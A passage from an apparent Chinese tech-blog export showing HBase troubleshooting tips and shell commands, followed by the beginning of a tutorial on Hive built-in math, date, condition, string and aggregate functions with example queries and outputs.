<p>服务器时间不同步造成的，安装ntp同步.</p>
<blockquote>
<h4 id="3-2-2-Failed-to-become-active-master-org-apache-hadoop-ipc-RemoteException-org-apache-hadoop-ipc-StandbyException-Operation-category-READ-is-not-supported-in-state-standby"><a href="#3-2-2-Failed-to-become-active-master-org-apache-hadoop-ipc-RemoteException-org-apache-hadoop-ipc-StandbyException-Operation-category-READ-is-not-supported-in-state-standby" class="headerlink" title="3.2.2 Failed to become active master org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.ipc.StandbyException): Operation category READ is not supported in state standby"></a>3.2.2 Failed to become active master org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.ipc.StandbyException): Operation category READ is not supported in state standby</h4></blockquote>
<p>将当前Hadoop NameNode节点更改为Active状态即可</p>
<blockquote>
<p>四、Hbase shell </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#启动Hadoop,hbase,进入hbase shell 交互界面</span></span><br><span class="line">/opt/hadoop/hbase-1.3.1/hbase shell</span><br><span class="line"></span><br><span class="line"><span class="comment">#版本信息</span></span><br><span class="line">hbase(main):001:0&gt; version</span><br><span class="line">1.3.1, r930b9a55528fe45d8edce7af42fef2d35e77677a, Thu Apr  6 19:36:54 PDT 2017</span><br><span class="line"></span><br><span class="line"><span class="comment">#集群状态</span></span><br><span class="line">hbase(main):002:0&gt; status    </span><br><span class="line">1 active master, 1 backup masters, 2 servers, 0 dead, 1.0000 average load</span><br><span class="line"></span><br><span class="line"><span class="comment">#create 创建表</span></span><br><span class="line">hbase(main):003:0&gt; create <span class="string">'user'</span>,<span class="string">'id'</span>,<span class="string">'name'</span>,<span class="string">'age'</span></span><br><span class="line">0 row(s) <span class="keyword">in</span> 7.2540 seconds</span><br><span class="line"></span><br><span class="line">=&gt; Hbase::Table - user</span><br><span class="line"></span><br><span class="line"><span class="comment">#describe,查看表结构</span></span><br><span class="line">hbase(main):004:0&gt; describe <span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">Table user is ENABLED                                                                                                                                                                                           </span><br><span class="line">user                                                                                                                                                                                                            </span><br><span class="line">COLUMN FAMILIES DESCRIPTION                                                                                                                                                                                     </span><br><span class="line">&#123;NAME =&gt; <span class="string">'age'</span>, BLOOMFILTER =&gt; <span class="string">'ROW'</span>, VERSIONS =&gt; <span class="string">'1'</span>, IN_MEMORY =&gt; <span class="string">'false'</span>, KEEP_DELETED_CELLS =&gt; <span class="string">'FALSE'</span>, DATA_BLOCK_ENCODING =&gt; <span class="string">'NONE'</span>, TTL =&gt; <span class="string">'FOREVER'</span>, COMPRESSION =&gt; <span class="string">'NONE'</span>, MIN_VERSIONS =&gt; <span class="string">'0'</span>, BLOCKCA</span><br><span class="line">CHE =&gt; <span class="string">'true'</span>, BLOCKSIZE =&gt; <span class="string">'65536'</span>, REPLICATION_SCOPE =&gt; <span class="string">'0'</span>&#125;                                                                                                                                                  </span><br><span class="line">&#123;NAME =&gt; <span class="string">'id'</span>, BLOOMFILTER =&gt; <span class="string">'ROW'</span>, VERSIONS =&gt; <span class="string">'1'</span>, IN_MEMORY =&gt; <span class="string">'false'</span>, KEEP_DELETED_CELLS =&gt; <span class="string">'FALSE'</span>, DATA_BLOCK_ENCODING =&gt; <span class="string">'NONE'</span>, TTL =&gt; <span class="string">'FOREVER'</span>, COMPRESSION =&gt; <span class="string">'NONE'</span>, MIN_VERSIONS =&gt; <span class="string">'0'</span>, BLOCKCAC</span><br><span class="line">HE =&gt; <span class="string">'true'</span>, BLOCKSIZE =&gt; <span class="string">'65536'</span>, REPLICATION_SCOPE =&gt; <span class="string">'0'</span>&#125;                                                                                                                                                   </span><br><span class="line">&#123;NAME =&gt; <span class="string">'name'</span>, BLOOMFILTER =&gt; <span class="string">'ROW'</span>, VERSIONS =&gt; <span class="string">'1'</span>, IN_MEMORY =&gt; <span class="string">'false'</span>, KEEP_DELETED_CELLS =&gt; <span class="string">'FALSE'</span>, DATA_BLOCK_ENCODING =&gt; <span class="string">'NONE'</span>, TTL =&gt; <span class="string">'FOREVER'</span>, COMPRESSION =&gt; <span class="string">'NONE'</span>, MIN_VERSIONS =&gt; <span class="string">'0'</span>, BLOCKC</span><br><span class="line">ACHE =&gt; <span class="string">'true'</span>, BLOCKSIZE =&gt; <span class="string">'65536'</span>, REPLICATION_SCOPE =&gt; <span class="string">'0'</span>&#125;                                                                                                                                                 </span><br><span class="line">3 row(s) <span class="keyword">in</span> 3.8890 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment">#put,添加数据</span></span><br><span class="line">hbase(main):007:0&gt; put <span class="string">'user'</span>,<span class="string">'row1'</span>,<span class="string">'age:y'</span>,<span class="string">'13'</span></span><br><span class="line">0 row(s) <span class="keyword">in</span> 0.0220 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):008:0&gt; put <span class="string">'user'</span>,<span class="string">'row1'</span>,<span class="string">'name:a'</span>,<span class="string">'...德'</span></span><br><span class="line">0 row(s) <span class="keyword">in</span> 0.0270 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#scan ,查看数据</span></span><br><span class="line">hbase(main):009:0&gt; scan <span class="string">'user'</span></span><br><span class="line">ROW                                                   COLUMN+CELL                                                                                                                                               </span><br><span class="line"> row1                                                 column=age:y, timestamp=1509012964601, value=13                                                                                                           </span><br><span class="line"> row1                                                 column=id:, timestamp=1509012933471, value=1                                                                                                              </span><br><span class="line"> row1                                                 column=name:a, timestamp=1509012990136, value=\xE7\xBA\xB3\xE5\x85\xB0\xE6\x80\xA7\xE5\xBE\xB7                                                            </span><br><span class="line">1 row(s) <span class="keyword">in</span> 0.0320 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment">#get ,获取第一行数据</span></span><br><span class="line">hbase(main):011:0&gt; get <span class="string">'user'</span>,<span class="string">'row1'</span></span><br><span class="line">COLUMN                                                CELL                                                                                                                                                      </span><br><span class="line"> age:y                                                timestamp=1509012964601, value=13                                                                                                                         </span><br><span class="line"> id:                                                  timestamp=1509012933471, value=1                                                                                                                          </span><br><span class="line"> name:a                                               timestamp=1509012990136, value=\xE7\xBA\xB3\xE5\x85\xB0\xE6\x80\xA7\xE5\xBE\xB7                                                                           </span><br><span class="line">1 row(s) <span class="keyword">in</span> 0.0410 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#exists ,表是否存在</span></span><br><span class="line">hbase(main):010:0&gt; exists <span class="string">'a'</span></span><br><span class="line">Table a does not exist                                                                                                                                                                                          </span><br><span class="line">0 row(s) <span class="keyword">in</span> 0.0480 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment">#disable,禁用表</span></span><br><span class="line">hbase(main):012:0&gt; <span class="built_in">disable</span> <span class="string">'user'</span></span><br><span class="line">0 row(s) <span class="keyword">in</span> 2.7300 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除表</span></span><br><span class="line">hbase(main):013:0&gt; drop <span class="string">'user'</span></span><br><span class="line">0 row(s) <span class="keyword">in</span> 1.2870 seconds</span><br><span class="line"></span><br><span class="line">hbase(main):014:0&gt; list</span><br><span class="line">TABLE                                                                                                                                                                                                           </span><br><span class="line">0 row(s) <span class="keyword">in</span> 0.0100 seconds</span><br><span class="line">=&gt; []</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title>Hive函数</title>
    <url>/2018/01/30/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hive%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>本篇主要介绍Hive的内置函数和自定义函数,以2.3.0版本为例.</p>
<h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><p>Hive内部提供了很多函数给开发者使用，包括数学函数，类型转换函数，条件函数，字符函数，聚合函数，表生成函数等等，这些函数都统称为内置函数。</p>
<h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 自然常数</span></span><br><span class="line"><span class="keyword">select</span> e();<span class="comment">--  2.718281828459045</span></span><br><span class="line"><span class="comment">-- 圆周率</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">pi</span>();<span class="comment">-- 3.141592653589793</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  正弦、余弦、正切、反正弦、反余弦、反正切</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">sin</span>(<span class="number">0</span>) ,<span class="keyword">cos</span>(<span class="number">0</span>),<span class="keyword">tan</span>(<span class="keyword">pi</span>()/<span class="number">4</span>),<span class="keyword">asin</span>(<span class="number">1</span>),<span class="keyword">acos</span>(<span class="number">1</span>),<span class="keyword">atan</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 弧度角度转换函数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">degrees</span>(<span class="keyword">pi</span>()/<span class="number">2</span>),<span class="keyword">radians</span>(<span class="number">90</span>);<span class="comment">--  90.0 | 1.5707963267948966</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- positive直接返回原数,negative 返回相反数,abs 绝对值</span></span><br><span class="line"><span class="keyword">select</span> positive(<span class="number">-32.4343</span>) , negative(<span class="number">-32</span>),<span class="keyword">abs</span>(<span class="number">-32</span>);<span class="comment">--  -32.4343  | 32 |32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 四舍五入函数 注意和bround的区别</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(<span class="number">12.62</span>),<span class="keyword">round</span>(<span class="number">12.55</span>,<span class="number">1</span>),<span class="keyword">round</span>(<span class="number">13.556</span>,<span class="number">2</span>),bround(<span class="number">12.65</span>,<span class="number">1</span>),bround(<span class="number">12.66</span>,<span class="number">1</span>);<span class="comment">--  13   | 12.6  | 13.56  | 12.6  | 12.7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  小于指定数字的最大数和大于指定数字的最小数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">floor</span>(<span class="number">12.98</span>),<span class="keyword">ceil</span>(<span class="number">12.32</span>);<span class="comment">-- 12 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 随机数,如果指定参数生成的随机数是固定的</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(),<span class="keyword">rand</span>(<span class="number">23</span>);</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- +-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line">|        _c0         |         _c1         |</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- +-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line">| 0.447675386320312  | 0.7321323355141605  |</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- +-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(),<span class="keyword">rand</span>(<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line">|         _c0         |         _c1         |</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line">| 0.6958761143570242  | 0.7321323355141605  |</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">rand</span>(),<span class="keyword">rand</span>(<span class="number">23</span>);</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line">|         _c0         |         _c1         |</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line">| 0.7471695196174757  | 0.7321323355141605  |</span><br><span class="line">+<span class="comment">-- -- -- -- -- -- -- -- -- -- -+-- -- -- -- -- -- -- -- -- -- -+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- a的b次幂,阶乘,平方根,立方根,自然常数e的n次方</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">pow</span>(<span class="number">2</span>,<span class="number">3</span>),factorial(<span class="number">4</span>),<span class="keyword">sqrt</span>(<span class="number">81</span>),cbrt(<span class="number">27</span>),<span class="keyword">exp</span>(<span class="number">2</span>);<span class="comment">--  8.0  | 24   | 9.0  | 3.0|7.3890560989306495</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  对数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ln</span>(e()),<span class="keyword">log2</span>(<span class="number">8</span>), <span class="keyword">log10</span>(<span class="number">100</span>),<span class="keyword">log</span>(<span class="number">4</span>,<span class="number">64</span>);<span class="comment">--  1.0  | 3.0  | 2.0  | 3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 最大值/最小值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">greatest</span>(<span class="number">12</span>,<span class="number">43</span>,<span class="number">54.32</span>,<span class="number">22.54</span>,<span class="number">34.22</span>),<span class="keyword">least</span>(<span class="number">12</span>,<span class="number">43</span>,<span class="number">54.32</span>,<span class="number">22.54</span>,<span class="number">34.22</span>);<span class="comment">-- 54.32  | 12.00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 左移、右移、无符号右移</span></span><br><span class="line"> <span class="keyword">select</span> shiftleft(<span class="number">2</span>,<span class="number">3</span>),shiftright(<span class="number">-12</span>,<span class="number">2</span>),shiftrightunsigned(<span class="number">12</span>,<span class="number">2</span>),shiftrightunsigned(<span class="number">-12</span>,<span class="number">2</span>);<span class="comment">--  16 | -3 | 3 | 1073741821</span></span><br></pre></td></tr></table></figure>
<h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前时间戳,返回Bigint</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">unix_timestamp</span>();<span class="comment">--  1517314216</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">current_date</span>();<span class="comment">--  2018-01-30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前时间字符串</span></span><br><span class="line"> <span class="keyword">select</span> <span class="keyword">current_timestamp</span>;<span class="comment">--  2018-01-30 20:08:45.598</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 时间戳转化为指定格式的字符串</span></span><br><span class="line"><span class="keyword">select</span> from_unixtime(<span class="number">1517314216</span>,<span class="string">'YYYY-MM-DD HH:mm:ss.SSS'</span>);<span class="comment">-- 2018-01-30 20:10:16.000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取时间戳的日期部分,返回日期对象</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">to_date</span>(<span class="string">'2016-10-21 20:20:21'</span>);<span class="comment">-- 2016-10-21</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取日期的年份</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">year</span>(<span class="string">'2014-10-21'</span>);<span class="comment">-- 2014</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取日期的月份</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">month</span>(<span class="string">'2014-10-21'</span>);<span class="comment">-- 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取日期的日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">day</span>(<span class="string">'2014-10-21 21:30:21'</span>);<span class="comment">-- 21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">dayofmonth</span>(<span class="string">'2014-10-21 21:30:21'</span>);<span class="comment">-- 21</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取日期的小时数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">hour</span>(<span class="string">'2014-10-21 21:30:21'</span>);<span class="comment">-- 21</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取日期的分钟数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">minute</span>(<span class="string">'2014-10-21 21:30:21'</span>);<span class="comment">-- 30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 取日期的秒数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">second</span>(<span class="string">'2014-10-21 21:30:21'</span>);<span class="comment">-- 21</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 日期加上指定天数后的日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_add</span>(<span class="string">'2014-10-21 21:30:21'</span>,<span class="number">2</span>);<span class="comment">-- 2014-10-23</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_add</span>(<span class="string">'2014-10-21 21:30:21'</span>,<span class="number">-2</span>);<span class="comment">-- 2014-10-19</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 日期减去指定天数后的日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_sub</span>(<span class="string">'2014-10-21 21:30:21'</span>,<span class="number">2</span>);<span class="comment">-- 2014-10-19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_sub</span>(<span class="string">'2014-10-21 21:30:21'</span>,<span class="number">-2</span>);<span class="comment">-- 2014-10-23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将日期转化为指定时区的时间</span></span><br><span class="line"><span class="keyword">select</span> from_utc_timestamp(<span class="string">'2018-09-21 12:11:21.231'</span>,<span class="string">'PST'</span>);<span class="comment">-- 2018-09-21 05:11:21.231</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> from_utc_timestamp(<span class="string">'2018-09-21 12:11:21.231'</span>,<span class="string">'UTC'</span>);<span class="comment">-- 2018-09-21 12:11:21.231</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> from_utc_timestamp(<span class="string">'2018-09-21 12:11:21.231'</span>,<span class="string">'GMT+8'</span>);<span class="comment">-- 2018-09-21 20:11:21.231</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> from_utc_timestamp(<span class="string">'2018-09-21 12:11:21.231'</span>,<span class="string">'UTC+8'</span>);<span class="comment">-- 2018-09-21 12:11:21.231</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- datediff(end,start) end-start的日期差</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">datediff</span>(<span class="string">'2012-12-08'</span>,<span class="string">'2012-12-20'</span>);<span class="comment">--  -12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取日期月份差值(end,start)</span></span><br><span class="line"><span class="keyword">select</span> months_between(<span class="string">'2012-12-08'</span>,<span class="string">'2013-12-20'</span>);<span class="comment">--  -12.38709677</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 指定日期添加指定月份的日期</span></span><br><span class="line"><span class="keyword">select</span> add_months(<span class="string">'2012-12-08'</span>,<span class="number">2</span>);<span class="comment">-- 2013-02-08</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取日期最后一天的日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">last_day</span>(<span class="string">'2012-12-08'</span>);<span class="comment">--  2012-12-31</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取当前时间开始的下一个 周一</span></span><br><span class="line"><span class="keyword">select</span> next_day(<span class="string">'2017-12-08'</span>,<span class="string">'MONDAY'</span>);<span class="comment">--  2017-12-11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 按照指定格式格式化截取日期  MONTH/MON/MM, YEAR/YYYY/YY.</span></span><br><span class="line"><span class="keyword">select</span> trunc(<span class="string">'2015-03-17'</span>, <span class="string">'YEAR'</span>);<span class="comment">--  2015-01-01</span></span><br><span class="line"><span class="keyword">select</span> trunc(<span class="string">'2015-03-17'</span>, <span class="string">'YYYY'</span>);<span class="comment">--  2015-01-01</span></span><br><span class="line"><span class="keyword">select</span> trunc(<span class="string">'2015-03-17'</span>, <span class="string">'MONTH'</span>);<span class="comment">--  2015-03-01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 指定格式格式化日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_format</span>(<span class="string">"2018-07-12"</span>,<span class="string">"MM-dd"</span>);<span class="comment">--  07-12</span></span><br></pre></td></tr></table></figure>
<h2 id="条件函数"><a href="#条件函数" class="headerlink" title="条件函数"></a>条件函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 是否为空判断函数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">isnull</span>(<span class="string">""</span>),<span class="keyword">isnull</span>(<span class="literal">null</span>),isnotnull(<span class="literal">null</span>),isnotnull(<span class="string">""</span>);<span class="comment">--  false  | true  | false  | true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  if(a,b,c) ,a为true返回b,a为false返回a</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>),<span class="keyword">if</span>(<span class="number">1</span>&lt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>); <span class="comment">-- 3 | 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 如果为null,返回一个默认值</span></span><br><span class="line"><span class="keyword">select</span> nvl(<span class="literal">null</span>,<span class="number">1</span>),nvl(<span class="number">2</span>,<span class="number">0</span>); <span class="comment">-- 1| 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回第一个不为null的值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">coalesce</span>(<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">2</span>,<span class="number">34</span>);<span class="comment">-- 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 断言,true返回null,否则抛出异常</span></span><br><span class="line"><span class="keyword">select</span> assert_true(<span class="number">1</span>&gt;<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Error: java.io.IOException: org.apache.hadoop.hive.ql.metadata.HiveException: ASSERT_TRUE(): assertion failed. (state=,code=0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> assert_true(<span class="number">1</span>==<span class="number">1</span>);</span><br><span class="line">+<span class="comment">-- -- -- -+</span></span><br><span class="line">|  _c0  |</span><br><span class="line">+<span class="comment">-- -- -- -+</span></span><br><span class="line">| NULL  |</span><br><span class="line">+<span class="comment">-- -- -- -+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  CASE a WHEN b THEN c [WHEN d THEN e] ELSE f, a==b返回c,a==d 返回e,否则返回f.</span></span><br><span class="line"> <span class="keyword">select</span> <span class="keyword">CASE</span> <span class="string">'3'</span> <span class="keyword">WHEN</span> <span class="string">'2'</span> <span class="keyword">THEN</span> <span class="string">'is true'</span> <span class="keyword">WHEN</span> <span class="string">'3'</span>  <span class="keyword">THEN</span> <span class="string">'equals 3'</span> <span class="keyword">ELSE</span> <span class="string">'No Result'</span> <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- CASE WHEN a THEN b [WHEN c THEN d]* [ELSE e] END; a为true 返回b,c为true返回d,否则返回e.</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span>==<span class="number">2</span> <span class="keyword">THEN</span> <span class="string">'is true'</span> <span class="keyword">WHEN</span> <span class="number">2</span>==<span class="number">3</span> <span class="keyword">THEN</span> <span class="string">'is false'</span> <span class="keyword">ELSE</span> <span class="string">'No result'</span> <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>
<h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 返回字符串的第一个字符的ascii值</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">'0ABCD'</span>);<span class="comment">-- 48</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回ascii值对应的字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">chr</span>(<span class="number">65</span>);<span class="comment">-- A</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回字符长度</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">character_length</span>(<span class="string">'哎呀A23456'</span>);<span class="comment">-- 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符串拼接</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">'234'</span>,<span class="string">'Abc哎呀'</span>);<span class="comment">-- 234Abc哎呀</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 用指定的分隔符拼接字符串</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'$'</span>,<span class="string">'2'</span>,<span class="string">"哎呀"</span>,<span class="string">"Python"</span>,<span class="string">"R"</span>,<span class="string">"Scala"</span>);<span class="comment">--  2$哎呀$Python$R$Scala</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  set中元素的位置,找不到返回0</span></span><br><span class="line"><span class="keyword">select</span> find_in_set(<span class="string">'1'</span>,<span class="string">'2,3,4,5,1,3,1'</span>);<span class="comment">-- 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  分割</span></span><br><span class="line"> <span class="keyword">select</span> <span class="keyword">split</span>(<span class="string">'a,b,c,d'</span>,<span class="string">','</span>);<span class="comment">-- ["a","b","c","d"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--  字符串截取、翻转、去空格,重复字符串N次</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="string">"ABC"</span>),<span class="keyword">substr</span>(<span class="string">"ABC123"</span>,<span class="number">3</span>),<span class="keyword">substring</span>(<span class="string">"ABC123"</span>,<span class="number">3</span>),</span><br><span class="line"><span class="keyword">trim</span>(<span class="string">" A B CDF  "</span>),<span class="keyword">reverse</span>(<span class="string">"ABCDE123"</span>),<span class="keyword">repeat</span>(<span class="string">'ABC'</span>,<span class="number">3</span>);<span class="comment">--  3    | C123  | C123  | A B CDF  | 321EDCBA |ABCABCABC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> substring_index(, <span class="keyword">string</span> delim, <span class="built_in">int</span> <span class="keyword">count</span>);<span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符串替换,仔细看看translate的用法</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">translate</span>(<span class="string">'ABCDE123ABC'</span>,<span class="string">'A'</span>,<span class="string">'##'</span>);<span class="comment">-- #BCDE123#BC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span> (<span class="string">'ABCDE123ABC'</span>,<span class="string">'A'</span>,<span class="string">'##'</span>);<span class="comment">--  ##BCDE123##BC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">translate</span>(<span class="string">'ABCDE123ABC'</span>,<span class="string">"AB"</span>,<span class="string">"#$#@"</span>);<span class="comment">-- #$CDE123#$C</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">translate</span>(<span class="string">'ABCDE123ABCD'</span>,<span class="string">"ABCD"</span>,<span class="string">"#$#@"</span>);<span class="comment">-- #$#@E123#$#@</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- soundex code,更多信息参考wiki</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">soundex</span>(<span class="string">'Hello'</span>);<span class="comment">-- H400</span></span><br></pre></td></tr></table></figure>
<p>二进制操作函数base64,unbase64暂时不举例了.</p>
<h2 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">返回值</th>
<th style="text-align:center">函数名称</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">BIGINT</td>
<td style="text-align:center">count(*), count(expr), count(DISTINCT expr[, expr…])</td>
<td style="text-align:center">总数</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">sum(col), sum(DISTINCT col)</td>
<td style="text-align:center">求和</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">avg(col), avg(DISTINCT col)</td>
<td style="text-align:center">求平均值</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">variance(col), var_pop(col)</td>
<td style="text-align:center">返回组中数字列的方差</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">var_samp(col)</td>
<td style="text-align:center">返回组中一个数值列的无偏样本方差</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">stddev_pop(col)</td>
<td style="text-align:center">返回组中数字列的标准差</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">stddev_samp(col)</td>
<td style="text-align:center">返回组中数字列的无偏抽样标准偏差</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">covar_pop(col1, col2)</td>
